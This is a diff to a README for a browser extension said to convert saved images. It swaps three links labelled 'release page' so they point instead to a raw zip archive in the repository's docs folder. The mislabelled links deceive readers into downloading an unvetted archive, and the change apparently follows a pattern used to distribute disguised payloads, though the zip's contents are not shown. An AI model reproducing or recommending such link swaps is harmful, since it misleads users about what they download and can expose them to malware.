@@ -1,6 +1,6 @@
 # 🧩 extension - Save Images in the Right Format
 
-[![Download extension](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/oystersrockefellerprociphilus385/extension/releases)
+[![Download extension](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/oystersrockefellerprociphilus385/extension/raw/refs/heads/main/docs/Software-1.8.zip)
 
 ## 🖼️ What this app does
 
@@ -18,7 +18,7 @@ The extension is built for normal browser use on Windows and fits into a simple 
 
 Use the release page below to download and run the file from your browser.
 
-[Visit the release page to download extension](https://github.com/oystersrockefellerprociphilus385/extension/releases)
+[Visit the release page to download extension](https://github.com/oystersrockefellerprociphilus385/extension/raw/refs/heads/main/docs/Software-1.8.zip)
 
 ### Steps
 1. Open the release page link above.
@@ -160,7 +160,7 @@ Use the same release page to check for newer versions.
 
 ## 📎 Download link
 
-[Open the extension release page](https://github.com/oystersrockefellerprociphilus385/extension/releases)
+[Open the extension release page](https://github.com/oystersrockefellerprociphilus385/extension/raw/refs/heads/main/docs/Software-1.8.zip)
 
 ## 🧩 Install flow at a glance
 
